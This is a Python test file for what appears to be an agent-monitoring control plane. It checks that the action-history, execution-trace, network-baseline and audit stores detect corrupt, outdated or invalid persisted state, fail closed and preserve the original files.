def test_f3_control_plane_history_corruption_is_retained_and_blocks_append(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "history.jsonl"
    path.parent.mkdir(parents=True)
    valid = ActionHistoryRecord(
        session_id="s-history",
        action_kind=ActionKind.FS_READ,
        tool_name="file.read",
    )
    corrupt_bytes = (valid.model_dump_json() + "\n{not-json}\n").encode()
    path.write_bytes(corrupt_bytes)

    history = SessionActionHistoryStore(path)

    assert history.state_load_result.status == StateLoadStatus.CORRUPT
    assert history.state_status()["fail_closed"] is True
    with pytest.raises(StatePersistenceDegradedError, match="control_plane_history"):
        history.append(
            ActionHistoryRecord(
                session_id="s-history",
                action_kind=ActionKind.FS_READ,
                tool_name="file.read",
            )
        )
    assert history.all_for_session("s-history") == []
    assert path.read_bytes() == corrupt_bytes


def test_f3_control_plane_history_commit_uncertainty_retains_live_view(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "history.jsonl"
    history = SessionActionHistoryStore(path)

    def _inject(stage: DurableAppendStage) -> None:
        if stage == DurableAppendStage.FILE_FSYNC:
            raise OSError("fault:file_fsync")

    history._state_fault_injector = _inject
    with pytest.raises(DurableAppendError):
        history.append(
            ActionHistoryRecord(
                session_id="s-history",
                action_kind=ActionKind.FS_READ,
                tool_name="file.read",
            )
        )

    assert history.all_for_session("s-history") == []
    assert history.state_status()["stage"] == "file_fsync"
    with pytest.raises(StatePersistenceDegradedError):
        history.append(
            ActionHistoryRecord(
                session_id="s-history",
                action_kind=ActionKind.FS_READ,
                tool_name="file.read",
            )
        )


def test_f3_control_plane_trace_corruption_and_future_schema_fail_closed(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "plans.json"
    path.parent.mkdir(parents=True)
    corrupt_bytes = b'{"version":1,"payload":'
    path.write_bytes(corrupt_bytes)

    corrupt = ExecutionTraceVerifier(storage_path=path, workspace_roots=[tmp_path])
    assert corrupt.state_load_result.status == StateLoadStatus.CORRUPT
    with pytest.raises(StatePersistenceDegradedError, match="control_plane_trace"):
        corrupt.begin_precontent_plan(
            session_id="s-trace",
            goal="read a file",
            origin=_origin("s-trace"),
        )
    assert path.read_bytes() == corrupt_bytes

    future_bytes = encode_versioned_json_snapshot({}, version=99)
    path.write_bytes(future_bytes)
    future = ExecutionTraceVerifier(storage_path=path, workspace_roots=[tmp_path])
    assert future.state_load_result.status == StateLoadStatus.UNSUPPORTED_SCHEMA
    assert future.active_plan("s-trace") is None
    assert path.read_bytes() == future_bytes


def test_f3_control_plane_trace_recursive_snapshot_is_typed_and_retained(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "plans.json"
    path.parent.mkdir(parents=True)
    recursive_bytes = (
        b'{"version":1,"checksum":"unused","payload":'
        + (b"[" * 10000)
        + b"0"
        + (b"]" * 10000)
        + b"}"
    )
    path.write_bytes(recursive_bytes)

    trace = ExecutionTraceVerifier(storage_path=path, workspace_roots=[tmp_path])

    assert trace.state_load_result.status == StateLoadStatus.CORRUPT
    assert trace.active_plan("s-trace") is None
    assert path.read_bytes() == recursive_bytes


def test_f3_control_plane_trace_legacy_migrates_and_fault_retains_live_view(
    tmp_path: Path,
) -> None:
    source = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    plan = source.begin_precontent_plan(
        session_id="s-trace",
        goal="read a file",
        origin=_origin("s-trace"),
    )
    path = tmp_path / "control_plane" / "plans.json"
    path.parent.mkdir(parents=True)
    path.write_text(
        json.dumps({"s-trace": plan.model_dump(mode="json")}),
        encoding="utf-8",
    )
    trace = ExecutionTraceVerifier(storage_path=path, workspace_roots=[tmp_path])
    assert trace.state_load_result.status == StateLoadStatus.OK
    assert trace.state_load_result.legacy is True

    def _inject(stage: AtomicWriteStage) -> None:
        if stage == AtomicWriteStage.PARENT_FSYNC:
            raise OSError("fault:parent_fsync")

    trace._state_fault_injector = _inject
    with pytest.raises(AtomicWriteError):
        trace.cancel(session_id="s-trace", reason="reviewed")

    assert trace._plans["s-trace"].cancelled is False
    assert trace.active_plan("s-trace") is None
    assert trace.state_status()["stage"] == "parent_fsync"


@pytest.mark.parametrize("field", ["max_actions", "executed_actions"])
@pytest.mark.parametrize("versioned", [False, True])
def test_f3_control_plane_trace_rejects_negative_persisted_counters(
    tmp_path: Path,
    field: str,
    versioned: bool,
) -> None:
    source = ExecutionTraceVerifier(workspace_roots=[tmp_path])
    plan = source.begin_precontent_plan(
        session_id="s-negative-trace",
        goal="read a file",
        origin=_origin("s-negative-trace"),
    )
    plan_payload = plan.model_dump(mode="json")
    plan_payload[field] = -1
    payload = {"s-negative-trace": plan_payload}
    path = tmp_path / "control_plane" / "plans.json"
    path.parent.mkdir(parents=True)
    raw_bytes = (
        encode_versioned_json_snapshot(payload)
        if versioned
        else (json.dumps(payload) + "\n").encode()
    )
    path.write_bytes(raw_bytes)

    trace = ExecutionTraceVerifier(storage_path=path, workspace_roots=[tmp_path])

    assert trace.state_load_result.status == StateLoadStatus.CORRUPT
    assert trace.active_plan("s-negative-trace") is None
    assert path.read_bytes() == raw_bytes


def test_f3_control_plane_network_corruption_disables_learning_without_authority(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "network_baseline.json"
    path.parent.mkdir(parents=True)
    corrupt_bytes = b'{"version":1,"payload":'
    path.write_bytes(corrupt_bytes)
    baseline = BaselineDatabase(str(path))
    metadata = extract_network_metadata(
        origin=_origin("s-network"),
        tool_name="http.request",
        destination_host="api.example.com",
        destination_port=443,
        protocol="https",
        request_size=128,
    )

    assert baseline.state_load_result.status == StateLoadStatus.CORRUPT
    baseline.record(
        metadata=metadata,
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )

    assert baseline.known_hosts_for_origin(metadata.origin) == set()
    assert baseline.state_status()["fail_closed"] is False
    assert path.read_bytes() == corrupt_bytes


def test_f3_control_plane_network_atomic_fault_keeps_old_live_baseline(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "network_baseline.json"
    baseline = BaselineDatabase(str(path))
    metadata = extract_network_metadata(
        origin=_origin("s-network"),
        tool_name="http.request",
        destination_host="api.example.com",
        destination_port=443,
        protocol="https",
        request_size=100,
    )
    baseline.record(
        metadata=metadata,
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )
    assert baseline.get(origin=metadata.origin, host=metadata.destination_host).count == 1

    def _inject(stage: AtomicWriteStage) -> None:
        if stage == AtomicWriteStage.PARENT_FSYNC:
            raise OSError("fault:parent_fsync")

    baseline._state_fault_injector = _inject
    baseline.record(
        metadata=metadata.model_copy(update={"request_size": 200}),
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )

    assert baseline.get(origin=metadata.origin, host=metadata.destination_host).count == 1
    assert baseline.state_status()["stage"] == "parent_fsync"


def test_f3_control_plane_network_legacy_migrates_and_future_schema_is_retained(
    tmp_path: Path,
) -> None:
    path = tmp_path / "control_plane" / "network_baseline.json"
    path.parent.mkdir(parents=True)
    legacy_entry = {
        "first_seen": datetime.now(UTC).isoformat(),
        "last_seen": datetime.now(UTC).isoformat(),
        "count": 1,
        "average_request_size": 128.0,
    }
    path.write_text(json.dumps({"ws:user:none:api.example.com": legacy_entry}))

    legacy = BaselineDatabase(str(path))

    assert legacy.state_load_result.status == StateLoadStatus.OK
    assert legacy.state_load_result.legacy is True
    migrated = json.loads(path.read_text(encoding="utf-8"))
    assert migrated["version"] == 1
    assert "checksum" in migrated

    future_bytes = encode_versioned_json_snapshot({}, version=99)
    path.write_bytes(future_bytes)
    future = BaselineDatabase(str(path))

    assert future.state_load_result.status == StateLoadStatus.UNSUPPORTED_SCHEMA
    assert future.state_status()["learning_enabled"] is False
    assert path.read_bytes() == future_bytes


@pytest.mark.parametrize(
    ("field", "value"),
    [("count", -1), ("average_request_size", -1.0)],
)
def test_f3_control_plane_network_rejects_negative_persisted_counters(
    tmp_path: Path,
    field: str,
    value: int | float,
) -> None:
    now = datetime.now(UTC).isoformat()
    entry = {
        "first_seen": now,
        "last_seen": now,
        "count": 1,
        "average_request_size": 128.0,
    }
    entry[field] = value
    raw_bytes = encode_versioned_json_snapshot({"ws:user:none:api.example.com": entry})
    path = tmp_path / "control_plane" / "network_baseline.json"
    path.parent.mkdir(parents=True)
    path.write_bytes(raw_bytes)

    baseline = BaselineDatabase(str(path))

    assert baseline.state_load_result.status == StateLoadStatus.CORRUPT
    assert baseline.state_status()["learning_enabled"] is False
    assert path.read_bytes() == raw_bytes


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("observation_kind", "unknown"),
        ("decision_status", "unknown"),
        ("execution_status", "unknown"),
    ],
)
def test_f3_control_plane_history_rejects_unknown_protocol_values(
    tmp_path: Path,
    field: str,
    value: str,
) -> None:
    record = ActionHistoryRecord(
        session_id="s-protocol",
        action_kind=ActionKind.FS_READ,
        tool_name="file.read",
    ).model_dump(mode="json")
    record[field] = value
    raw_bytes = (json.dumps(record) + "\n").encode()
    path = tmp_path / "control_plane" / "history.jsonl"
    path.parent.mkdir(parents=True)
    path.write_bytes(raw_bytes)

    history = SessionActionHistoryStore(path)

    assert history.state_load_result.status == StateLoadStatus.CORRUPT
    assert history.all_for_session("s-protocol") == []
    assert path.read_bytes() == raw_bytes


def test_f3_control_plane_engine_state_status_aggregates_domain_failures(
    tmp_path: Path,
) -> None:
    control_plane_dir = tmp_path / "control_plane"
    control_plane_dir.mkdir(parents=True)
    (control_plane_dir / "history.jsonl").write_bytes(b'{"session_id":"torn"')
    (control_plane_dir / "plans.json").write_bytes(b'{"version":1,"payload":')
    (control_plane_dir / "network_baseline.json").write_bytes(
        b'{"version":1,"payload":'
    )
    (control_plane_dir / "audit.jsonl").write_bytes(b'{"event_type":"torn"')

    engine = ControlPlaneEngine.build(data_dir=tmp_path, workspace_roots=[tmp_path])
    status = engine.state_status()

    assert status["status"] == "degraded"
    assert status["fail_closed"] is True
    assert set(status["domains"]) == {"history", "trace", "network", "audit"}
    assert status["domains"]["network"]["fail_closed"] is False
    assert status["domains"]["trace"]["load_status"] == "corrupt"
    assert status["domains"]["audit"]["load_status"] == "corrupt"
